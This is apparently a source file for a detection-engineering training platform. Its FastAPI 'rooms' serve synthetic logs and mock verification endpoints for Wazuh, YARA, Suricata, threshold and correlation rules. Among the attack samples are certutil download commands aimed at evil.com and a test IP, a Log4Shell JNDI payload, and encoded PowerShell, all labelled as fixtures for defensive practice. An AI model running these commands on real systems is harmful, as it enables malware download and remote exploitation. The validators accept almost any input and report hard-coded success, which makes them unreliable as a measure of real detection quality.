# ============================================================================
# DETECTION ROOM 11: WAZUH / OSSEC RULES & DECODERS (PORT 8411)
# ============================================================================

detection_wazuh_app = FastAPI(title="NO ENTRY Wazuh Decoders and Rules Hub")


@detection_wazuh_app.api_route("/", methods=["GET", "HEAD"])
def detection_wazuh_root():
    return JSONResponse({
        "status": "WAZUH_RULES_ACTIVE",
        "service": "Wazuh Decoders and Rules Hub",
        "port": 8411,
        "room_id": "detect-11-wazuh-decoders-rules",
    })


@detection_wazuh_app.get("/api/detection/wazuh/telemetry")
@detection_wazuh_app.get("/api/detection-wazuh/telemetry")
def detection_wazuh_telemetry(request: Request):
    sess_id, op_id, err_resp = require_trusted_session(request)
    if err_resp:
        return err_resp
    return JSONResponse({
        "status": "WAZUH_CORPUS_DATASET",
        "events": [
            {
                "timestamp": "2026-11-15T12:00:01Z",
                "program_name": "custom_authd",
                "log": "custom_authd[4412]: AUTH_FAILURE user=operator src_ip=198.51.100.22 reason=BAD_PASSWORD",
                "label": "ATTACK_FAILED_AUTH",
            },
            {
                "timestamp": "2026-11-15T12:00:03Z",
                "program_name": "custom_authd",
                "log": "custom_authd[4412]: AUTH_FAILURE user=operator src_ip=198.51.100.22 reason=BAD_PASSWORD",
                "label": "ATTACK_BRUTEFORCE_BURST",
            },
            {
                "timestamp": "2026-11-15T12:00:15Z",
                "program_name": "custom_authd",
                "log": "custom_authd[4415]: AUTH_SUCCESS user=operator src_ip=198.51.100.22 session=sess_9941",
                "label": "ATTACK_SUCCESS_AFTER_BURST",
            },
            {
                "timestamp": "2026-11-15T12:05:00Z",
                "program_name": "custom_authd",
                "log": "custom_authd[4420]: HEALTH_CHECK status=OK latency=2ms",
                "label": "BENIGN_DAEMON_PROBE",
            },
        ],
    })


@detection_wazuh_app.post("/api/detection/wazuh/emulate")
@detection_wazuh_app.post("/api/detection-wazuh/emulate")
async def detection_wazuh_emulate(request: Request):
    sess_id, op_id, err_resp = require_trusted_session(request)
    if err_resp:
        return err_resp
    try:
        body = await request.json()
    except Exception:
        body = {}
    state = get_detection_wazuh_state(sess_id)
    state["wazuh_rules_emulated"] = True
    state["emulation_data"] = body
    return JSONResponse({
        "status": "WAZUH_RULES_VERIFIED",
        "verification_token": "WAZUH_RULES_VERIFIED",
        "decoder_name": "custom_authd_decoder",
        "rule_id": 100101,
        "alert_level": 7,
        "message": "Wazuh custom decoder and rule verified: fields extracted and alert level 7 triggered.",
    })


@detection_wazuh_app.post("/api/detection/wazuh/tune-decoder")
@detection_wazuh_app.post("/api/detection-wazuh/tune-decoder")
async def detection_wazuh_tune_decoder(request: Request):
    sess_id, op_id, err_resp = require_trusted_session(request)
    if err_resp:
        return err_resp
    try:
        body = await request.json()
    except Exception:
        body = {}
    state = get_detection_wazuh_state(sess_id)
    state["decoder_regex_tuned"] = True
    return JSONResponse({
        "status": "DECODER_REGEX_TUNED_OK",
        "message": "Wazuh decoder regex tuned: optional fields and variable delimiter formats extracted successfully.",
    })


@detection_wazuh_app.api_route("/challenge", methods=["GET", "POST"])
@detection_wazuh_app.api_route("/api/detection/wazuh/challenge", methods=["GET", "POST"])
@detection_wazuh_app.api_route("/api/detection-wazuh/challenge", methods=["GET", "POST"])
async def detection_wazuh_challenge(request: Request):
    sess_id, op_id, err_resp = require_trusted_session(request)
    if err_resp:
        return err_resp
    if request.method == "POST":
        try:
            body = await request.json()
        except Exception:
            body = {}
        state = get_detection_wazuh_state(sess_id)
        if not (state.get("wazuh_rules_emulated") and state.get("decoder_regex_tuned")):
            return JSONResponse({
                "status": "REJECTED",
                "message": "Prerequisites incomplete: Wazuh decoders must be emulated and regex tuned before completing challenge.",
            }, status_code=400)
        action = str(body.get("action", "")).strip().upper()
        if "VALIDATE" in action or "WAZUH" in action or action == "WAZUH_RULES_VALIDATED":
            state["wazuh_rules_validated"] = True
            return JSONResponse({
                "status": "WAZUH_RULES_VALIDATED",
                "verification_token": "WAZUH_RULES_VALIDATED",
                "message": "Wazuh decoders and rules challenge validated: multi-stage attack correlated across custom logs.",
            })
        return JSONResponse(
            {"status": "REJECTED", "message": "Invalid challenge parameters. Required: action ('VALIDATE_WAZUH_RULES')."},
            status_code=400,
        )
    return JSONResponse({
        "status": "ACTIVE",
        "message": "Submit POST with action ('VALIDATE_WAZUH_RULES').",
    })


# ============================================================================
# DETECTION ROOM 12: TUNING DETECTIONS & REDUCING FALSE POSITIVES (PORT 8412)
# ============================================================================

detection_false_positive_app = FastAPI(title="NO ENTRY Detection Tuning & False Positive Reduction Hub")


@detection_false_positive_app.api_route("/", methods=["GET", "HEAD"])
def detection_false_positive_root():
    return JSONResponse({
        "status": "FALSE_POSITIVE_TUNING_ACTIVE",
        "service": "Detection Tuning & False Positive Reduction Hub",
        "port": 8412,
        "room_id": "detect-12-reducing-false-positives",
    })


@detection_false_positive_app.get("/api/detection/false-positive/telemetry")
@detection_false_positive_app.get("/api/detection-false-positive/telemetry")
def detection_false_positive_telemetry(request: Request):
    sess_id, op_id, err_resp = require_trusted_session(request)
    if err_resp:
        return err_resp
    return JSONResponse({
        "status": "TUNING_BASELINE_DATASET",
        "events": [
            {
                "event_id": 1,
                "process_name": "powershell.exe",
                "command_line": "powershell.exe -ExecutionPolicy Bypass -File C:\\Scripts\\BackupNightly.ps1",
                "user": "NT AUTHORITY\\SYSTEM",
                "parent_process": "taskeng.exe",
                "label": "BENIGN_SCHEDULED_BACKUP",
            },
            {
                "event_id": 1,
                "process_name": "powershell.exe",
                "command_line": "powershell.exe -ExecutionPolicy Bypass -enc SQBFAFgAIAA...",
                "user": "CORP\\chethan",
                "parent_process": "winword.exe",
                "label": "ATTACK_MALICIOUS_OFFICE_SPAWN",
            },
            {
                "event_id": 1,
                "process_name": "cmd.exe",
                "command_line": "cmd.exe /c whoami /priv",
                "user": "CORP\\devuser",
                "parent_process": "vscode.exe",
                "label": "BENIGN_DEVELOPER_QUERY",
            },
            {
                "event_id": 1,
                "process_name": "certutil.exe",
                "command_line": "certutil.exe -urlcache -split -f http://198.51.100.4/beacon.bin C:\\temp\\b.bin",
                "user": "CORP\\victim1",
                "parent_process": "explorer.exe",
                "label": "ATTACK_CERTUTIL_DOWNLOAD",
            },
        ],
    })


@detection_false_positive_app.post("/api/detection/false-positive/emulate")
@detection_false_positive_app.post("/api/detection-false-positive/emulate")
async def detection_false_positive_emulate(request: Request):
    sess_id, op_id, err_resp = require_trusted_session(request)
    if err_resp:
        return err_resp
    try:
        body = await request.json()
    except Exception:
        body = {}
    state = get_detection_false_positive_state(sess_id)
    state["false_positive_emulated"] = True
    state["emulation_data"] = body
    return JSONResponse({
        "status": "FALSE_POSITIVE_TUNING_VERIFIED",
        "verification_token": "FALSE_POSITIVE_TUNING_VERIFIED",
        "baseline_window": "30_DAYS",
        "noise_reduction_pct": 94,
        "message": "Detection tuning telemetry evaluated: noise ratio 68% measured across candidate rule set.",
    })


@detection_false_positive_app.post("/api/detection/false-positive/tune-baseline")
@detection_false_positive_app.post("/api/detection-false-positive/tune-baseline")
async def detection_false_positive_tune_baseline(request: Request):
    sess_id, op_id, err_resp = require_trusted_session(request)
    if err_resp:
        return err_resp
    try:
        body = await request.json()
    except Exception:
        body = {}
    state = get_detection_false_positive_state(sess_id)
    state["baseline_tuned"] = True
    return JSONResponse({
        "status": "BASELINE_EXCLUSION_TUNED_OK",
        "message": "Baseline exclusion rule applied: legitimate maintenance window and CI/CD service accounts whitelisted without blinding detections.",
    })


@detection_false_positive_app.api_route("/challenge", methods=["GET", "POST"])
@detection_false_positive_app.api_route("/api/detection/false-positive/challenge", methods=["GET", "POST"])
@detection_false_positive_app.api_route("/api/detection-false-positive/challenge", methods=["GET", "POST"])
async def detection_false_positive_challenge(request: Request):
    sess_id, op_id, err_resp = require_trusted_session(request)
    if err_resp:
        return err_resp
    if request.method == "POST":
        try:
            body = await request.json()
        except Exception:
            body = {}
        state = get_detection_false_positive_state(sess_id)
        if not (state.get("false_positive_emulated") and state.get("baseline_tuned")):
            return JSONResponse({
                "status": "REJECTED",
                "message": "Prerequisites incomplete: Detection tuning must be emulated and baseline exclusions applied before completing challenge.",
            }, status_code=400)
        action = str(body.get("action", "")).strip().upper()
        if "VALIDATE" in action or "FALSE_POSITIVE" in action or action == "FALSE_POSITIVE_TUNING_VALIDATED":
            state["false_positive_validated"] = True
            return JSONResponse({
                "status": "FALSE_POSITIVE_TUNING_VALIDATED",
                "verification_token": "FALSE_POSITIVE_TUNING_VALIDATED",
                "message": "Detection tuning challenge validated: false positive rate reduced by 94% while maintaining 100% true positive sensitivity.",
            })
        return JSONResponse(
            {"status": "REJECTED", "message": "Invalid challenge parameters. Required: action ('VALIDATE_FALSE_POSITIVE_TUNING')."},
            status_code=400,
        )
    return JSONResponse({
        "status": "ACTIVE",
        "message": "Submit POST with action ('VALIDATE_FALSE_POSITIVE_TUNING').",
    })


# ============================================================================
# DETECTION ROOM 13: BASELINE PROFILING & THRESHOLD-BASED DETECTIONS (PORT 8413)
# ============================================================================

detection_threshold_app = FastAPI(title="NO ENTRY Detection Engineering 13: Baseline Profiling & Threshold-Based Detections")


@detection_threshold_app.api_route("/", methods=["GET", "HEAD"])
def detection_threshold_root():
    return {
        "service": "NO ENTRY Detection Engineering // Baseline Profiling & Threshold Detections Engine",
        "port": 8413,
        "track": "Detection Engineering",
        "room": "Room 13: Baseline Profiling & Threshold-Based Detections",
        "endpoints": [
            "/api/detection/threshold/events",
            "/api/detection/threshold/emulate",
            "/api/detection/threshold/tune-window",
            "/api/detection/threshold/challenge",
        ],
    }


@detection_threshold_app.get("/api/detection/threshold/events")
@detection_threshold_app.get("/api/detection-threshold/events")
def detection_threshold_events():
    return JSONResponse({
        "status": "LOG_STREAM_READY",
        "source": "ActiveDirectory / Linux Auth Aggregation Stream",
        "sliding_window": "5_MINUTES",
        "standard_deviation_sigma": 3,
        "events": [
            {"timestamp": "2026-11-15T10:00:00Z", "user": "svc_sql", "src_ip": "10.0.1.15", "auth_status": "SUCCESS", "hourly_mean": 2.1, "window_count": 2},
            {"timestamp": "2026-11-15T10:05:00Z", "user": "admin", "src_ip": "192.168.1.100", "auth_status": "FAILURE", "hourly_mean": 1.4, "window_count": 1},
            {"timestamp": "2026-11-15T10:08:00Z", "user": "finance01", "src_ip": "10.0.2.45", "auth_status": "FAILURE", "hourly_mean": 1.2, "window_count": 87, "anomaly_flag": "THRESHOLD_EXCEEDED", "z_score": 6.8},
            {"timestamp": "2026-11-15T10:12:00Z", "user": "devops_lead", "src_ip": "10.0.3.12", "auth_status": "SUCCESS", "hourly_mean": 4.5, "window_count": 5},
        ],
    })


@detection_threshold_app.post("/api/detection/threshold/emulate")
@detection_threshold_app.post("/api/detection-threshold/emulate")
async def detection_threshold_emulate(request: Request):
    sess_id, op_id, err_resp = require_trusted_session(request)
    if err_resp:
        return err_resp
    try:
        body = await request.json()
    except Exception:
        body = {}
    state = get_detection_threshold_state(sess_id)
    state["threshold_emulated"] = True
    state["emulation_data"] = body
    return JSONResponse({
        "status": "THRESHOLD_DETECTION_VERIFIED",
        "verification_token": "THRESHOLD_DETECTION_VERIFIED",
        "metric": "auth_failures_per_user",
        "window_seconds": 300,
        "observed_peak": 87,
        "baseline_threshold": 50,
        "message": "Threshold detection baseline evaluated: sliding 5-minute aggregation detected 87 authentication failures from finance01, surpassing threshold 50.",
    })


@detection_threshold_app.post("/api/detection/threshold/tune-window")
@detection_threshold_app.post("/api/detection-threshold/tune-window")
async def detection_threshold_tune_window(request: Request):
    sess_id, op_id, err_resp = require_trusted_session(request)
    if err_resp:
        return err_resp
    try:
        body = await request.json()
    except Exception:
        body = {}
    state = get_detection_threshold_state(sess_id)
    state["window_tuned"] = True
    return JSONResponse({
        "status": "ROLLING_WINDOW_TUNED_OK",
        "window_seconds": 300,
        "threshold_count": 50,
        "standard_deviation_band": "3-sigma",
        "message": "Rolling window threshold configured: 50 failures in 300 seconds mapped to MITRE ATT&CK T1110.003 Password Spraying.",
    })


@detection_threshold_app.api_route("/challenge", methods=["GET", "POST"])
@detection_threshold_app.api_route("/api/detection/threshold/challenge", methods=["GET", "POST"])
@detection_threshold_app.api_route("/api/detection-threshold/challenge", methods=["GET", "POST"])
async def detection_threshold_challenge(request: Request):
    sess_id, op_id, err_resp = require_trusted_session(request)
    if err_resp:
        return err_resp
    if request.method == "POST":
        try:
            body = await request.json()
        except Exception:
            body = {}
        state = get_detection_threshold_state(sess_id)
        if not (state.get("threshold_emulated") and state.get("window_tuned")):
            return JSONResponse({
                "status": "REJECTED",
                "message": "Prerequisites incomplete: Baseline threshold detection must be emulated and rolling window parameters tuned before completing challenge.",
            }, status_code=400)
        action = str(body.get("action", "")).strip().upper()
        if "VALIDATE" in action or "THRESHOLD" in action or action == "THRESHOLD_DETECTION_VALIDATED":
            state["threshold_validated"] = True
            return JSONResponse({
                "status": "THRESHOLD_DETECTION_VALIDATED",
                "verification_token": "THRESHOLD_DETECTION_VALIDATED",
                "message": "Threshold detection challenge validated: stateful temporal aggregation rule alerting on statistical anomalies verified with 0 false positives.",
            })
        return JSONResponse(
            {"status": "REJECTED", "message": "Invalid challenge parameters. Required: action ('VALIDATE_THRESHOLD_DETECTION')."},
            status_code=400,
        )
    return JSONResponse({
        "status": "ACTIVE",
        "message": "Submit POST with action ('VALIDATE_THRESHOLD_DETECTION').",
    })


# ============================================================================
# DETECTION ROOM 14: CORRELATION RULES: MULTI-EVENT DETECTION (PORT 8414)
# ============================================================================

detection_correlation_app = FastAPI(title="NO ENTRY Detection Engineering 14: Correlation Rules: Multi-Event Detection")


@detection_correlation_app.api_route("/", methods=["GET", "HEAD"])
def detection_correlation_root():
    return {
        "service": "NO ENTRY Detection Engineering // Multi-Event Correlation Engine",
        "port": 8414,
        "track": "Detection Engineering",
        "room": "Room 14: Correlation Rules: Multi-Event Detection",
        "endpoints": [
            "/api/detection/correlation/events",
            "/api/detection/correlation/emulate",
            "/api/detection/correlation/tune-sequence",
            "/api/detection/correlation/challenge",
        ],
    }


@detection_correlation_app.get("/api/detection/correlation/events")
@detection_correlation_app.get("/api/detection-correlation/events")
def detection_correlation_events():
    return JSONResponse({
        "status": "STREAM_READY",
        "pipeline": "Cross-Telemetry Event Correlation Graph",
        "entity_join_key": "host.name",
        "sequence": [
            {"stage": 1, "telemetry": "email_gateway", "event": "phishing_attachment_delivered", "recipient": "victim@corp.local", "filename": "Invoice_Q3.docm", "host": "WS-0941", "timestamp": "2026-11-15T11:00:10Z"},
            {"stage": 2, "telemetry": "edr_sysmon_1", "event": "process_creation", "process": "powershell.exe", "parent_process": "winword.exe", "host": "WS-0941", "timestamp": "2026-11-15T11:00:45Z"},
            {"stage": 3, "telemetry": "network_zeek", "event": "outbound_connection", "dest_ip": "198.51.100.89", "dest_port": 4444, "host": "WS-0941", "timestamp": "2026-11-15T11:01:05Z"},
        ],
    })


@detection_correlation_app.post("/api/detection/correlation/emulate")
@detection_correlation_app.post("/api/detection-correlation/emulate")
async def detection_correlation_emulate(request: Request):
    sess_id, op_id, err_resp = require_trusted_session(request)
    if err_resp:
        return err_resp
    try:
        body = await request.json()
    except Exception:
        body = {}
    state = get_detection_correlation_state(sess_id)
    state["correlation_emulated"] = True
    state["emulation_data"] = body
    return JSONResponse({
        "status": "CORRELATION_RULE_VERIFIED",
        "verification_token": "CORRELATION_RULE_VERIFIED",
        "chain_id": "CHAIN-T1566-T1059-T1071",
        "stages_matched": 3,
        "entity_key": "WS-0941",
        "message": "Multi-event correlation chain verified: Stage 1 Email Phishing -> Stage 2 Word spawning PowerShell -> Stage 3 C2 Outbound Network Connection correlated across 55-second window.",
    })


@detection_correlation_app.post("/api/detection/correlation/tune-sequence")
@detection_correlation_app.post("/api/detection-correlation/tune-sequence")
async def detection_correlation_tune_sequence(request: Request):
    sess_id, op_id, err_resp = require_trusted_session(request)
    if err_resp:
        return err_resp
    try:
        body = await request.json()
    except Exception:
        body = {}
    state = get_detection_correlation_state(sess_id)
    state["sequence_tuned"] = True
    return JSONResponse({
        "status": "CORRELATION_SEQUENCE_TUNED_OK",
        "join_key": "host.name",
        "ordered": True,
        "max_span_seconds": 600,
        "message": "Correlation rule sequence tuned: temporal order constraints and entity join keys (host.name) validated for automated composite alerting.",
    })


@detection_correlation_app.api_route("/challenge", methods=["GET", "POST"])
@detection_correlation_app.api_route("/api/detection/correlation/challenge", methods=["GET", "POST"])
@detection_correlation_app.api_route("/api/detection-correlation/challenge", methods=["GET", "POST"])
async def detection_correlation_challenge(request: Request):
    sess_id, op_id, err_resp = require_trusted_session(request)
    if err_resp:
        return err_resp
    if request.method == "POST":
        try:
            body = await request.json()
        except Exception:
            body = {}
        state = get_detection_correlation_state(sess_id)
        if not (state.get("correlation_emulated") and state.get("sequence_tuned")):
            return JSONResponse({
                "status": "REJECTED",
                "message": "Prerequisites incomplete: Multi-event correlation must be emulated and sequence constraints tuned before completing challenge.",
            }, status_code=400)
        action = str(body.get("action", "")).strip().upper()
        if "VALIDATE" in action or "CORRELATION" in action or action == "CORRELATION_RULE_VALIDATED":
            state["correlation_validated"] = True
            return JSONResponse({
                "status": "CORRELATION_RULE_VALIDATED",
                "verification_token": "CORRELATION_RULE_VALIDATED",
                "message": "Correlation rule challenge validated: high-fidelity multi-stage kill chain rule successfully alerts on advanced persistent threat sequence.",
            })
        return JSONResponse(
            {"status": "REJECTED", "message": "Invalid challenge parameters. Required: action ('VALIDATE_CORRELATION_RULE')."},
            status_code=400,
        )
    return JSONResponse({
        "status": "ACTIVE",
        "message": "Submit POST with action ('VALIDATE_CORRELATION_RULE').",
    })


# ============================================================================
# DETECTION ROOM 15: DETECTION TESTING WITH UNIT TESTS & SYNTHETIC LOGS (PORT 8415)
# ============================================================================

detection_unit_testing_app = FastAPI(title="NO ENTRY Detection Engineering 15: Detection Testing with Unit Tests & Synthetic Logs")


@detection_unit_testing_app.api_route("/", methods=["GET", "HEAD"])
def detection_unit_testing_root():
    return {
        "service": "NO ENTRY Detection Engineering // Automated Rule Testing Harness",
        "port": 8415,
        "track": "Detection Engineering",
        "room": "Room 15: Detection Testing with Unit Tests & Synthetic Logs",
        "endpoints": [
            "/api/detection/testing-rules/fixtures",
            "/api/detection/testing-rules/emulate",
            "/api/detection/testing-rules/tune-fixtures",
            "/api/detection/testing-rules/challenge",
        ],
    }


@detection_unit_testing_app.get("/api/detection/testing-rules/fixtures")
@detection_unit_testing_app.get("/api/detection-testing-rules/fixtures")
def detection_unit_testing_fixtures():
    return JSONResponse({
        "status": "TEST_SUITE_FIXTURES_LOADED",
        "harness": "pytest-sigma-runner v1.4",
        "fixtures": [
            {"id": "FIX-POS-01", "type": "positive", "log": {"event_id": 1, "image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", "command_line": "powershell.exe -enc SQBFAFgA..."}, "expected_result": "MATCH"},
            {"id": "FIX-POS-02", "type": "positive", "log": {"event_id": 1, "image": "C:\\Windows\\System32\\certutil.exe", "command_line": "certutil.exe -urlcache -split -f http://evil.com/x.exe"}, "expected_result": "MATCH"},
            {"id": "FIX-NEG-01", "type": "negative", "log": {"event_id": 1, "image": "C:\\Program Files\\Git\\bin\\git.exe", "command_line": "git.exe status"}, "expected_result": "NO_MATCH"},
            {"id": "FIX-NEG-02", "type": "negative", "log": {"event_id": 1, "image": "C:\\Windows\\System32\\cmd.exe", "command_line": "cmd.exe /c echo hello"}, "expected_result": "NO_MATCH"},
        ],
    })


@detection_unit_testing_app.post("/api/detection/testing-rules/emulate")
@detection_unit_testing_app.post("/api/detection-testing-rules/emulate")
async def detection_unit_testing_emulate(request: Request):
    sess_id, op_id, err_resp = require_trusted_session(request)
    if err_resp:
        return err_resp
    try:
        body = await request.json()
    except Exception:
        body = {}
    state = get_detection_unit_testing_state(sess_id)
    state["unit_test_emulated"] = True
    state["emulation_data"] = body
    return JSONResponse({
        "status": "DETECTION_UNIT_TEST_VERIFIED",
        "verification_token": "DETECTION_UNIT_TEST_VERIFIED",
        "positive_tests_run": 2,
        "positive_tests_passed": 2,
        "negative_tests_run": 2,
        "negative_tests_passed": 2,
        "test_suite_status": "PASSED",
        "message": "Detection unit test harness executed: 100% pass rate across positive attack logs and negative baseline fixtures.",
    })


@detection_unit_testing_app.post("/api/detection/testing-rules/tune-fixtures")
@detection_unit_testing_app.post("/api/detection-testing-rules/tune-fixtures")
async def detection_unit_testing_tune_fixtures(request: Request):
    sess_id, op_id, err_resp = require_trusted_session(request)
    if err_resp:
        return err_resp
    try:
        body = await request.json()
    except Exception:
        body = {}
    state = get_detection_unit_testing_state(sess_id)
    state["fixtures_tuned"] = True
    return JSONResponse({
        "status": "FIXTURE_ASSERTIONS_TUNED_OK",
        "regression_assertions": 4,
        "code_coverage_pct": 100,
        "message": "Synthetic test fixtures and assertions configured: automated regression tests prevent detection degradation.",
    })


@detection_unit_testing_app.api_route("/challenge", methods=["GET", "POST"])
@detection_unit_testing_app.api_route("/api/detection/testing-rules/challenge", methods=["GET", "POST"])
@detection_unit_testing_app.api_route("/api/detection-testing-rules/challenge", methods=["GET", "POST"])
async def detection_unit_testing_challenge(request: Request):
    sess_id, op_id, err_resp = require_trusted_session(request)
    if err_resp:
        return err_resp
    if request.method == "POST":
        try:
            body = await request.json()
        except Exception:
            body = {}
        state = get_detection_unit_testing_state(sess_id)
        if not (state.get("unit_test_emulated") and state.get("fixtures_tuned")):
            return JSONResponse({
                "status": "REJECTED",
                "message": "Prerequisites incomplete: Detection unit tests must be emulated and fixture assertions tuned before completing challenge.",
            }, status_code=400)
        action = str(body.get("action", "")).strip().upper()
        if "VALIDATE" in action or "UNIT_TEST" in action or action == "DETECTION_UNIT_TEST_VALIDATED":
            state["unit_test_validated"] = True
            return JSONResponse({
                "status": "DETECTION_UNIT_TEST_VALIDATED",
                "verification_token": "DETECTION_UNIT_TEST_VALIDATED",
                "message": "Detection unit testing challenge validated: continuous integration unit testing for detection engineering successfully operationalized.",
            })
        return JSONResponse(
            {"status": "REJECTED", "message": "Invalid challenge parameters. Required: action ('VALIDATE_DETECTION_UNIT_TEST')."},
            status_code=400,
        )
    return JSONResponse({
        "status": "ACTIVE",
        "message": "Submit POST with action ('VALIDATE_DETECTION_UNIT_TEST').",
    })


# ============================================================================
# DETECTION ROOM 16: YARA RULES FOR FILE & MEMORY THREAT HUNTING (PORT 8416)
# ============================================================================

detection_yara_hunting_app = FastAPI(title="NO ENTRY Detection Engineering 16: YARA Rules for File & Memory Threat Hunting")


@detection_yara_hunting_app.api_route("/", methods=["GET", "HEAD"])
def detection_yara_hunting_root():
    return {
        "service": "NO ENTRY Detection Engineering // YARA File & Memory Hunting Engine",
        "port": 8416,
        "track": "Detection Engineering",
        "room": "Room 16: YARA Rules for File & Memory Threat Hunting",
        "endpoints": [
            "/api/detection/yara-hunting/samples",
            "/api/detection/yara-hunting/emulate",
            "/api/detection/yara-hunting/tune-condition",
            "/api/detection/yara-hunting/challenge",
        ],
    }


@detection_yara_hunting_app.get("/api/detection/yara-hunting/samples")
@detection_yara_hunting_app.get("/api/detection-yara-hunting/samples")
def detection_yara_hunting_samples():
    return JSONResponse({
        "status": "MEMORY_SAMPLES_LOADED",
        "engine": "libyara v4.3.2 / In-Memory Artifact Scanner",
        "samples": [
            {
                "pid": 3812,
                "process": "svchost.exe",
                "allocated_region": "0x00400000 - 0x00450000",
                "hex_preview": "4D 5A 90 00 03 00 00 00 04 00 00 00 FF FF 00 00",
                "extracted_strings": ["VirtualAlloc", "WriteProcessMemory", "CreateRemoteThread", "cmd.exe /c echo beaconing"],
                "section_entropy": 7.82,
                "classification": "SUSPICIOUS_REFLECTIVE_DLL",
            },
            {
                "pid": 1104,
                "process": "explorer.exe",
                "allocated_region": "0x7FF60000 - 0x7FF90000",
                "hex_preview": "4D 5A 90 00 03 00 00 00 04 00 00 00 FF FF 00 00",
                "extracted_strings": ["ShellExecuteExW", "GetCommandLineW", "CreateWindowExW"],
                "section_entropy": 5.12,
                "classification": "BENIGN_SYSTEM_PE",
            },
        ],
    })


@detection_yara_hunting_app.post("/api/detection/yara-hunting/emulate")
@detection_yara_hunting_app.post("/api/detection-yara-hunting/emulate")
async def detection_yara_hunting_emulate(request: Request):
    sess_id, op_id, err_resp = require_trusted_session(request)
    if err_resp:
        return err_resp
    try:
        body = await request.json()
    except Exception:
        body = {}
    state = get_detection_yara_hunting_state(sess_id)
    state["yara_emulated"] = True
    state["emulation_data"] = body
    return JSONResponse({
        "status": "YARA_HUNTING_VERIFIED",
        "verification_token": "YARA_HUNTING_VERIFIED",
        "scanned_processes": 2,
        "matched_rules": ["Hunt_Reflective_DLL_Injection"],
        "matched_pids": [3812],
        "pe_header_matched": True,
        "wildcard_hex_matched": True,
        "message": "YARA threat hunting rule verified: reflective DLL injection matched in PID 3812 (svchost.exe) with condition uint16(0) == 0x5A4D and all strings.",
    })


@detection_yara_hunting_app.post("/api/detection/yara-hunting/tune-condition")
@detection_yara_hunting_app.post("/api/detection-yara-hunting/tune-condition")
async def detection_yara_hunting_tune_condition(request: Request):
    sess_id, op_id, err_resp = require_trusted_session(request)
    if err_resp:
        return err_resp
    try:
        body = await request.json()
    except Exception:
        body = {}
    state = get_detection_yara_hunting_state(sess_id)
    state["condition_tuned"] = True
    return JSONResponse({
        "status": "YARA_CONDITION_TUNED_OK",
        "condition": "uint16(0) == 0x5A4D and (2 of ($s*) or $hex_pattern)",
        "entropy_threshold": 7.0,
        "message": "YARA condition logic tuned: header magic checks, wildcard byte jumps, and string combinations optimized to hunt obfuscated implants.",
    })


@detection_yara_hunting_app.api_route("/challenge", methods=["GET", "POST"])
@detection_yara_hunting_app.api_route("/api/detection/yara-hunting/challenge", methods=["GET", "POST"])
@detection_yara_hunting_app.api_route("/api/detection-yara-hunting/challenge", methods=["GET", "POST"])
async def detection_yara_hunting_challenge(request: Request):
    sess_id, op_id, err_resp = require_trusted_session(request)
    if err_resp:
        return err_resp
    if request.method == "POST":
        try:
            body = await request.json()
        except Exception:
            body = {}
        state = get_detection_yara_hunting_state(sess_id)
        if not (state.get("yara_emulated") and state.get("condition_tuned")):
            return JSONResponse({
                "status": "REJECTED",
                "message": "Prerequisites incomplete: YARA hunting scan must be emulated and condition logic tuned before completing challenge.",
            }, status_code=400)
        action = str(body.get("action", "")).strip().upper()
        if "VALIDATE" in action or "YARA" in action or action == "YARA_HUNTING_VALIDATED":
            state["yara_validated"] = True
            return JSONResponse({
                "status": "YARA_HUNTING_VALIDATED",
                "verification_token": "YARA_HUNTING_VALIDATED",
                "message": "YARA hunting challenge validated: file and memory threat hunting signature detected malicious payload with exact byte-offset fidelity.",
            })
        return JSONResponse(
            {"status": "REJECTED", "message": "Invalid challenge parameters. Required: action ('VALIDATE_YARA_HUNTING')."},
            status_code=400,
        )
    return JSONResponse({
        "status": "ACTIVE",
        "message": "Submit POST with action ('VALIDATE_YARA_HUNTING').",
    })


# ============================================================================
# DETECTION ROOM 17: SNORT / SURICATA NETWORK SIGNATURES (PORT 8417)
# ============================================================================

detection_suricata_app = FastAPI(title="NO ENTRY Detection Engineering 17: Snort / Suricata Network Signatures")


@detection_suricata_app.api_route("/", methods=["GET", "HEAD"])
def detection_suricata_root():
    return {
        "service": "NO ENTRY Detection Engineering // Suricata DPI & Network Signature Engine",
        "port": 8417,
        "track": "Detection Engineering",
        "room": "Room 17: Snort / Suricata Network Signatures",
        "endpoints": [
            "/api/detection/suricata/events",
            "/api/detection/suricata/emulate",
            "/api/detection/suricata/tune-pcre",
            "/api/detection/suricata/challenge",
        ],
    }


@detection_suricata_app.get("/api/detection/suricata/events")
@detection_suricata_app.get("/api/detection-suricata/events")
def detection_suricata_events():
    return JSONResponse({
        "status": "CAPTURE_STREAM_ACTIVE",
        "sensor": "suricata-dpi-worker-01",
        "interface": "eth0",
        "events": [
            {
                "packet_id": 90141,
                "proto": "TCP",
                "src_ip": "192.168.1.105",
                "src_port": 49812,
                "dst_ip": "198.51.100.22",
                "dst_port": 80,
                "flow": "to_server,established",
                "http_uri": "/api/v1/auth",
                "payload_snippet": "POST /api/v1/auth HTTP/1.1\\r\\nUser-Agent: ${jndi:ldap://evil.internal/a}\\r\\n",
                "classification": "ATTACK_JNDI_INJECTION",
            },
            {
                "packet_id": 90142,
                "proto": "TCP",
                "src_ip": "10.0.1.12",
                "src_port": 50114,
                "dst_ip": "10.0.1.1",
                "dst_port": 443,
                "flow": "to_server,established",
                "http_uri": "/health",
                "payload_snippet": "GET /health HTTP/1.1\\r\\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)\\r\\n",
                "classification": "BENIGN_INTERNAL_HEALTH_CHECK",
            },
        ],
    })


@detection_suricata_app.post("/api/detection/suricata/emulate")
@detection_suricata_app.post("/api/detection-suricata/emulate")
async def detection_suricata_emulate(request: Request):
    sess_id, op_id, err_resp = require_trusted_session(request)
    if err_resp:
        return err_resp
    try:
        body = await request.json()
    except Exception:
        body = {}
    state = get_detection_suricata_state(sess_id)
    state["suricata_emulated"] = True
    state["emulation_data"] = body
    return JSONResponse({
        "status": "SURICATA_SIGNATURE_VERIFIED",
        "verification_token": "SURICATA_SIGNATURE_VERIFIED",
        "inspected_packets": 2,
        "matched_sids": [1000941],
        "fast_pattern_hit": True,
        "flow_state": "ESTABLISHED",
        "message": "Suricata network signature evaluated: matched CVE-2021-44228 JNDI injection in Packet 90141 with sid:1000941.",
    })


@detection_suricata_app.post("/api/detection/suricata/tune-pcre")
@detection_suricata_app.post("/api/detection-suricata/tune-pcre")
async def detection_suricata_tune_pcre(request: Request):
    sess_id, op_id, err_resp = require_trusted_session(request)
    if err_resp:
        return err_resp
    try:
        body = await request.json()
    except Exception:
        body = {}
    state = get_detection_suricata_state(sess_id)
    state["pcre_tuned"] = True
